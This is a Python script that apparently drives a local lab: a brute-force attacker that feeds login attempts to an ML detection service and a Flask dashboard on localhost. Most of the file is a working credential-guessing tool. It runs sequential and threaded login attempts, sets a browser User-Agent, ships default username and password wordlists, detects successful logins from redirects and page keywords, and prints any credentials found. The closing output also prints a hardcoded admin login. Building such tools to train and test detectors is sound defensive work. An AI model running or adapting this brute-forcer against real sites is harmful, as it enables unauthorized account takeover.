#!/usr/bin/env python3
"""
Python Brute Force Attacker
Simulates Burp Suite Intruder functionality with detailed logging
"""

import requests
import time
import concurrent.futures
import json
from datetime import datetime
from urllib.parse import urljoin
import re
import os
import sys

# Import ML service for real-time detection
try:
    from ml_service import ml_detector
    ML_AVAILABLE = True
    print("[ML] ML detection service loaded successfully")
except ImportError as e:
    print(f"[WARNING] ML service not available: {e}")
    ML_AVAILABLE = False

# Import database models for storing ML detections
try:
    from app import db, MLDetection
    from datetime import datetime
    DB_AVAILABLE = True
    print("[DB] Database connection available for ML storage")
    
    # Import Flask app for context
    try:
        from app import app
        FLASK_APP_AVAILABLE = True
        print("[FLASK] Flask app available for database context")
    except ImportError:
        FLASK_APP_AVAILABLE = False
        print("[WARNING] Flask app not available")
        
except ImportError as e:
    print(f"[WARNING] Database not available: {e}")
    DB_AVAILABLE = False
    FLASK_APP_AVAILABLE = False

class BruteForceResult:
    """Stores detailed results for each brute force attempt"""
    
    def __init__(self, request_num, payload1, payload2, source_ip="127.0.0.1"):
        self.request = request_num
        self.payload1 = payload1  # Username
        self.payload2 = payload2  # Password
        self.source_ip = source_ip  # Source IP address
        self.status_code = None
        self.response_received = None
        self.error = None
        self.timeout = None
        self.length = None
        self.comment = ""
        self.timestamp = datetime.now()
        self.response_time = None
        self.redirect_url = None
        self.cookies = None
        self.headers = {}
        
    def to_dict(self):
        """Convert result to dictionary for logging"""
        return {
            'request': self.request,
            'payload1': self.payload1,
            'payload2': self.payload2,
            'status_code': self.status_code,
            'response_received': self.response_received,
            'error': self.error,
            'timeout': self.timeout,
            'length': self.length,
            'comment': self.comment,
            'timestamp': self.timestamp.isoformat(),
            'response_time': self.response_time,
            'redirect_url': self.redirect_url
        }

class BruteForceAttacker:
    """Main brute force attacker class"""
    
    def __init__(self, target_url, username_field="username", password_field="password"):
        self.target_url = target_url
        self.username_field = username_field
        self.password_field = password_field
        self.session = requests.Session()
        self.results = []
        self.successful_logins = []
        
        # Default headers to mimic a real browser
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
    
    def analyze_response(self, response, payload1, payload2):
        """Analyze response and generate comments"""
        # Extract target host from URL for IP
        target_host = requests.utils.urlparse(self.target_url).netloc
        result = BruteForceResult(len(self.results) + 1, payload1, payload2, target_host)
        
        # Basic response info
        result.status_code = response.status_code
        result.length = len(response.content)
        result.response_received = len(response.content)
        result.response_time = response.elapsed.total_seconds()
        
        # Headers analysis
        result.headers = dict(response.headers)
        result.cookies = dict(response.cookies)
        
        # Check for redirects
        if response.status_code in [301, 302, 303, 307, 308]:
            result.redirect_url = response.headers.get('Location', '')
            result.comment = f"Redirect to: {result.redirect_url}"
            
            # Check if redirect indicates successful login
            if 'admin' in result.redirect_url or 'dashboard' in result.redirect_url:
                result.comment += " - LIKELY SUCCESSFUL LOGIN"
                self.successful_logins.append(result)
        
        # Status code analysis
        elif response.status_code == 200:
            result.comment = "OK - Check response content for success indicators"
            
            # Check response content for success/failure indicators
            content = response.text.lower()
            
            # Success indicators
            if any(indicator in content for indicator in ['dashboard', 'welcome', 'logout', 'profile']):
                result.comment += " - SUCCESSFUL LOGIN DETECTED"
                self.successful_logins.append(result)
            
            # Failure indicators
            elif any(indicator in content for indicator in ['invalid', 'incorrect', 'failed', 'error']):
                result.comment += " - LOGIN FAILED"
            
            else:
                result.comment += " - UNCLEAR - Manual review needed"
        
        elif response.status_code == 401:
            result.comment = "Unauthorized - Login failed"
        
        elif response.status_code == 403:
            result.comment = "Forbidden - Access denied"
        
        elif response.status_code == 404:
            result.comment = "Not found - URL may be incorrect"
        
        elif response.status_code == 500:
            result.comment = "Server error"
        
        else:
            result.comment = f"HTTP {response.status_code}"
        
        return result
    
    def detect_attack_with_ml(self, result):
        """Use ML to detect if this attempt is an attack"""
        if not ML_AVAILABLE:
            return None, 0.0
        
        try:
            # Create features for ML prediction
            features = {
                'ip': self.encode_ip(result.source_ip),
                'password_length': len(result.payload2),
                'status': result.status_code or 200,
                'response_size': result.length or 0,
                'time_diff': result.response_time or 0.0,
                'attempt_count_ip': len(self.results) + 1,  # Current attempt count
                'failed_flag': 1  # Always mark brute force attempts as potentially suspicious
            }
            
            # Get ML prediction
            prediction, probability = ml_detector.brute_force_detector.predict_attack(features)
            
            # For brute force attacks, be more sensitive - lower threshold
            attack_threshold = 0.25  # Even lower threshold for brute force
            
            if probability >= attack_threshold:  # Attack detected with lower threshold
                print(f"[ML DETECTION] Attack detected! IP: {result.source_ip}")
                return True, probability
            else:
                return False, probability
                
        except Exception as e:
            print(f"[ML ERROR] Detection failed: {e}")
            return None, 0.0
    
    def store_ml_detection(self, result, is_attack, probability):
        """Store ML detection in database for web interface"""
        if not DB_AVAILABLE or not is_attack or not FLASK_APP_AVAILABLE:
            return
        
        try:
            # Use Flask app context for database operations
            with app.app_context():
                # Create ML detection record with same features as detection
                ml_detection = MLDetection(
                    features=json.dumps({
                        'ip': self.encode_ip(result.source_ip),
                        'password_length': len(result.payload2),
                        'status': result.status_code,
                        'response_size': result.length,
                        'time_diff': result.response_time,
                        'attempt_count_ip': len(self.results) + 1,
                        'failed_flag': 1  # Always mark brute force as suspicious
                    }),
                    prediction=1,  # Attack detected
                    probability=probability,
                    source_ip=result.source_ip,
                    attack_type='brute_force',
                    detected_at=datetime.utcnow()  # Bug 3 fix: was datetime.now() causing 5.5hr lockout
                )
                
                # Store in database
                db.session.add(ml_detection)
                db.session.commit()
                print(f"[DB] ML detection stored: {result.source_ip}")
            
        except Exception as e:
            print(f"[DB ERROR] Failed to store ML detection: {e}")
            try:
                with app.app_context():
                    db.session.rollback()
            except:
                pass
    
    def encode_ip(self, ip_str):
        """Encode IP address for ML model"""
        try:
            parts = ip_str.split('.')
            return (int(parts[0]) * 16777216 + 
                   int(parts[1]) * 65536 + 
                   int(parts[2]) * 256 + 
                   int(parts[3]))
        except:
            return 127000001  # Default to 127.0.0.1
    
    def single_attempt(self, username, password, timeout=10):
        """Perform a single brute force attempt"""
        try:
            # Prepare form data
            data = {
                self.username_field: username,
                self.password_field: password
            }
            
            # Make request with timeout
            start_time = time.time()
            response = self.session.post(
                self.target_url, 
                data=data, 
                timeout=timeout,
                allow_redirects=False  # Don't follow redirects automatically
            )
            end_time = time.time()
            
            # Analyze response
            result = self.analyze_response(response, username, password)
            result.timeout = timeout
            result.response_time = end_time - start_time
            
            # Run ML detection on this attempt
            if ML_AVAILABLE:
                is_attack, probability = self.detect_attack_with_ml(result)
                if is_attack:
                    result.comment += f" [ML ATTACK DETECTED]"
                    print(f"[ML ALERT] Real-time attack detected: {username}/{password}")
                    # Store ML detection in database for web interface
                    self.store_ml_detection(result, is_attack, probability)
            
            return result
            
        except requests.exceptions.Timeout:
            # Extract target host from URL for IP
            target_host = requests.utils.urlparse(self.target_url).netloc
            result = BruteForceResult(len(self.results) + 1, username, password, target_host)
            result.error = "Timeout"
            result.timeout = timeout
            result.comment = "Request timed out"
            
            # Run ML detection on timeout
            if ML_AVAILABLE:
                is_attack, probability = self.detect_attack_with_ml(result)
                if is_attack:
                    result.comment += f" [ML ATTACK DETECTED]"
                    # Store ML detection in database for web interface
                    self.store_ml_detection(result, is_attack, probability)
            
            return result
            
        except requests.exceptions.ConnectionError:
            # Extract target host from URL for IP
            target_host = requests.utils.urlparse(self.target_url).netloc
            result = BruteForceResult(len(self.results) + 1, username, password, target_host)
            result.error = "Connection Error"
            result.comment = "Failed to connect to server"
            
            # Run ML detection on connection error
            if ML_AVAILABLE:
                is_attack, probability = self.detect_attack_with_ml(result)
                if is_attack:
                    result.comment += f" [ML ATTACK DETECTED]"
                    # Store ML detection in database for web interface
                    self.store_ml_detection(result, is_attack, probability)
            
            return result
            
        except Exception as e:
            # Extract target host from URL for IP
            target_host = requests.utils.urlparse(self.target_url).netloc
            result = BruteForceResult(len(self.results) + 1, username, password, target_host)
            result.error = str(e)
            result.comment = f"Error: {str(e)}"
            
            # Run ML detection on general error
            if ML_AVAILABLE:
                is_attack, probability = self.detect_attack_with_ml(result)
                if is_attack:
                    result.comment += f" [ML ATTACK DETECTED]"
                    # Store ML detection in database for web interface
                    self.store_ml_detection(result, is_attack, probability)
            
            return result
    
    def attack_sequential(self, usernames, passwords, delay=0.5):
        """Perform sequential brute force attack"""
        print(f"\n[INFO] Starting sequential brute force attack...")
        print(f"Target: {self.target_url}")
        print(f"Usernames: {len(usernames)}, Passwords: {len(passwords)}")
        print(f"Total attempts: {len(usernames) * len(passwords)}")
        print("-" * 80)
        
        request_num = 0
        
        for username in usernames:
            for password in passwords:
                request_num += 1
                print(f"Attempt {request_num}: {username}/{password}", end=" ... ")
                
                result = self.single_attempt(username, password)
                self.results.append(result)
                
                # Log to monitoring API
                self.log_to_api(result)
                
                print(f"[{result.status_code}] {result.comment}")
                
                # Add delay between attempts
                if delay > 0:
                    time.sleep(delay)
                
                # Stop if we found successful login
                if result.status_code in [302, 200] and 'SUCCESS' in result.comment:
                    print(f"\n🎉 SUCCESS FOUND: {username}/{password}")
                    break
            
            # Break outer loop if successful
            if any('SUCCESS' in r.comment for r in self.results):
                break
        
        return self.results
    
    def attack_concurrent(self, usernames, passwords, max_workers=5, delay=0.1):
        """Perform concurrent brute force attack"""
        print(f"🚀 Starting concurrent brute force attack...")
        print(f"Target: {self.target_url}")
        print(f"Max workers: {max_workers}")
        print(f"Total attempts: {len(usernames) * len(passwords)}")
        print("-" * 80)
        
        # Create all combinations
        combinations = []
        for username in usernames:
            for password in passwords:
                combinations.append((username, password))
        
        def attempt_with_delay(credentials):
            username, password = credentials
            result = self.single_attempt(username, password)
            
            # Log to API
            self.log_to_api(result)
            
            # Add delay
            if delay > 0:
                time.sleep(delay)
            
            return result
        
        # Execute with thread pool
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_credentials = {
                executor.submit(attempt_with_delay, combo): combo 
                for combo in combinations
            }
            
            for future in concurrent.futures.as_completed(future_to_credentials):
                credentials = future_to_credentials[future]
                try:
                    result = future.result()
                    self.results.append(result)
                    print(f"Attempt {result.request}: {credentials[0]}/{credentials[1]} [{result.status_code}] {result.comment}")
                except Exception as e:
                    print(f"Error with {credentials}: {e}")
        
        return self.results
    
    def log_to_api(self, result):
        """Log attempt to monitoring API"""
        try:
            api_data = {
                "source_ip": "Python Brute Force Tool",
                "target_url": self.target_url,
                "target_host": requests.utils.urlparse(self.target_url).netloc,
                "payload": f"Username: {result.payload1}, Password: {result.payload2}",
                "status_code": result.status_code,
                "method": "POST",
                "user_agent": "Python Brute Force Tool",
                "severity": "low" if result.status_code in [200, 302] and "SUCCESS" in result.comment else "medium",
                "description": f"Brute force attempt #{result.request}: {result.comment}",
                "response_time": result.response_time,
                "response_length": result.length,
                "error": result.error
            }
            
            response = requests.post("http://localhost:5000/api/logs/brute_force", json=api_data, timeout=5)
            if response.status_code == 201:
                pass  # Success
            else:
                print(f"API logging failed: {response.text}")
                
        except Exception as e:
            print(f"Failed to log to API: {e}")
    
    def print_results_table(self):
        """Print results in Burp Suite Intruder style table"""
        print("\n" + "=" * 100)
        print("BRUTE FORCE RESULTS TABLE")
        print("=" * 100)
        
        # Table header
        header = f"{'Request':<8} {'Payload1':<15} {'Payload2':<15} {'Status':<6} {'Response':<10} {'Error':<15} {'Timeout':<8} {'Length':<8} {'Comment'}"
        print(header)
        print("-" * 100)
        
        # Table rows
        for result in self.results:
            status = str(result.status_code) if result.status_code else "N/A"
            response = str(result.response_received) if result.response_received else "0"
            error = result.error[:14] if result.error else ""
            timeout = str(result.timeout) if result.timeout else "N/A"
            length = str(result.length) if result.length else "0"
            comment = result.comment[:40] + "..." if len(result.comment) > 40 else result.comment
            
            row = f"{result.request:<8} {result.payload1:<15} {result.payload2:<15} {status:<6} {response:<10} {error:<15} {timeout:<8} {length:<8} {comment}"
            print(row)
        
        print("-" * 100)
        print(f"Total attempts: {len(self.results)}")
        print(f"Successful logins: {len(self.successful_logins)}")
        
        if self.successful_logins:
            print("\n🎉 SUCCESSFUL CREDENTIALS:")
            for success in self.successful_logins:
                print(f"  Username: {success.payload1}, Password: {success.payload2}")
    
    def encode_ip(self, ip_str):
        """Encode IP address to numeric value for ML model"""
        try:
            parts = ip_str.split('.')
            return (int(parts[0]) * 16777216 + 
                   int(parts[1]) * 65536 + 
                   int(parts[2]) * 256 + 
                   int(parts[3]))
        except:
            return 127000001  # Default to 127.0.0.1
    
    def export_results(self, filename="brute_force_results.json"):
        """Export results to JSON file in ML model format"""
        
        # Convert results to ML model format
        ml_results = []
        
        for result in self.results:
            # Extract features for ML model
            features = {
                'ip': self.encode_ip(result.source_ip),
                'password_length': len(result.payload2),
                'status': result.status_code,
                'response_size': result.length,
                'time_diff': result.response_time,
                'attempt_count_ip': 1,  # Single attempt per IP
                'failed_flag': 1 if result.status_code != 200 else 0,
                'is_attack': 1 if result.status_code != 200 else 0  # ML model treats non-200 as attack
            }
            
            ml_results.append(features)
        
        # Create ML-compatible JSON structure
        results_data = {
            'scan_info': {
                'target': self.target_url,
                'scan_type': 'brute_force_attack',
                'timestamp': datetime.now().isoformat(),
                'total_attempts': len(self.results)
            },
            'results': ml_results
        }
        
        with open(filename, 'w') as f:
            json.dump(results_data, f, indent=2)
        
        print(f"[INFO] Results exported to: {filename}")
        print(f"[INFO] Created {len(ml_results)} ML-compatible entries for analysis")
        return filename  # Bug 5 fix: was returning None, causing print in main() to show 'None'

def main():
    """Main function to run brute force attacks"""
    
    # Configuration
    target_url = "http://localhost:5000/login"
    
    print("[ATTACKER] PYTHON BRUTE FORCE ATTACKER")
    print("=" * 50)
    
    # Choose attack mode
    print("\nChoose attack mode:")
    print("1. Use default username/password lists")
    print("2. Manual username/password entry")
    print("3. Generate long passwords (9+ chars)")
    print("4. Custom attack with user input")
    print("5. Quick 20 attempts only")
    
    try:
        choice = input("\nEnter your choice (1-5): ").strip()
        
        # Create attacker instance
        attacker = BruteForceAttacker(target_url)
        
        if choice == "1":
            # Default attack with existing lists
            usernames = [
                "administrator", "admin_user", "root_user", "test_account", "guest_user",
                "manager_user", "service_account", "backup_user", "system_admin", "default_user"
            ]
            
            passwords = [
                "password12345", "admin12345678", "welcome2024", "changeme2024", 
                "defaultpassword", "temp12345678", "accessgranted", "securitypass",
                "systempassword", "administrator2024", "testpassword123", "guestaccess123",
                "managerpassword", "serviceaccount", "backuppassword", "rootaccess123"
            ]
            results = attacker.attack_sequential(usernames, passwords, delay=0.5)
            
        elif choice == "2":
            # Manual entry
            print("\n[ENTRY] Manual Entry Mode:")
            username = input("Enter username (9+ characters): ").strip()
            password = input("Enter password (9+ characters): ").strip()
            
            # Validate input length
            if len(username) < 9:
                print(f"[WARNING] Username '{username}' must be 9+ characters! Padding to minimum...")
                username = username.ljust(9, 'x')
            
            if len(password) < 9:
                print(f"[WARNING] Password '{password}' must be 9+ characters! Padding to minimum...")
                password = password.ljust(9, 'x')
            
            print(f"\n[INFO] Testing: {username}/{password}")
            results = attacker.attack_sequential([username], [password], delay=1)
            
        elif choice == "3":
            # Generate long passwords
            print("\n[GENERATOR] Generating long passwords (9+ characters)...")
            usernames = ["admin", "administrator", "root", "user"]
            
            # Generate long passwords
            long_passwords = [
                "admin123456789", "password123456", "welcome2024admin",
                "changeme2024now", "defaultpassword2024", "temp123456789",
                "accessgranted2024", "securitypassword2024", "systemadmin2024",
                "testuserpassword", "guestaccess2024", "managerpassword2024",
                "rootaccess2024", "administrator2024", "superuserpassword",
                "mysecurepassword123", "complexpassword2024", "strongpassword2024"
            ]
            
            print(f"[INFO] Generated {len(long_passwords)} long passwords (9+ chars each)")
            results = attacker.attack_sequential(usernames, long_passwords, delay=0.3)
            
        elif choice == "4":
            # Custom attack with user input
            print("\n[CUSTOM] Custom Attack Mode:")
            
            # Get usernames
            user_input = input("Enter usernames (comma-separated, 9+ chars each): ").strip()
            usernames = [u.strip() for u in user_input.split(',') if u.strip()]
            
            # Get passwords
            pass_input = input("Enter passwords (comma-separated, 9+ chars each): ").strip()
            passwords = [p.strip() for p in pass_input.split(',') if p.strip()]
            
            # Validate lengths
            valid_usernames = []
            valid_passwords = []
            
            for username in usernames:
                if len(username) < 9:
                    print(f"[WARNING] Username '{username}' must be 9+ characters! Padding...")
                    valid_usernames.append(username.ljust(9, 'x'))
                else:
                    valid_usernames.append(username)
            
            for password in passwords:
                if len(password) < 9:
                    print(f"[WARNING] Password '{password}' must be 9+ characters! Padding...")
                    valid_passwords.append(password.ljust(9, 'x'))
                else:
                    valid_passwords.append(password)
            
            print(f"\n[INFO] Starting attack with {len(valid_usernames)} usernames and {len(valid_passwords)} passwords")
            results = attacker.attack_concurrent(valid_usernames, valid_passwords, max_workers=3, delay=0.2)
            
        elif choice == "5":
            # Quick 20 attempts only
            print("\n[QUICK] 20 Attempts Only Mode:")
            usernames = ["admin", "administrator", "root", "user"]
            passwords = [
                "password12345", "admin12345678", "welcome2024", "changeme2024",
                "defaultpassword", "temp12345678", "accessgranted", "securitypass",
                "systempassword", "administrator2024", "testpassword123", "guestaccess123"
            ]
            
            # Limit to 20 attempts
            max_attempts = 20
            limited_combinations = []
            attempt_count = 0
            
            for username in usernames:
                for password in passwords:
                    if attempt_count >= max_attempts:
                        break
                    limited_combinations.append((username, password))
                    attempt_count += 1
                if attempt_count >= max_attempts:
                    break
            
            print(f"[INFO] Running {len(limited_combinations)} limited attempts...")
            
            # Run limited attack manually
            results = []
            for i, (username, password) in enumerate(limited_combinations):
                print(f"Attempt {i+1}: {username}/{password}", end=" ... ")
                result = attacker.single_attempt(username, password)
                results.append(result)
                attacker.results.append(result)
                
                # Log to monitoring API
                attacker.log_to_api(result)
                
                print(f"[{result.status_code}] {result.comment}")
                
                # Add delay between attempts
                if i < len(limited_combinations) - 1:
                    time.sleep(0.5)
            
        else:
            print("[ERROR] Invalid choice")
            return
        
        # Print results table
        attacker.print_results_table()
        
        # Export results
        exported_file = attacker.export_results()
        print(f"[INFO] Results saved to: {exported_file}")
        
        print(f"\n[INFO] Check monitoring dashboard at: http://localhost:5000/dashboard")
        print(f"[INFO] Admin dashboard: http://localhost:5000/admin (admin/admin123)")
        
    except KeyboardInterrupt:
        print("\n\n[WARNING] Attack interrupted by user")
        if 'attacker' in locals() and attacker.results:
            attacker.print_results_table()
            attacker.export_results()
    except Exception as e:
        print(f"\n[ERROR] Error: {e}")

if __name__ == "__main__":
    main()
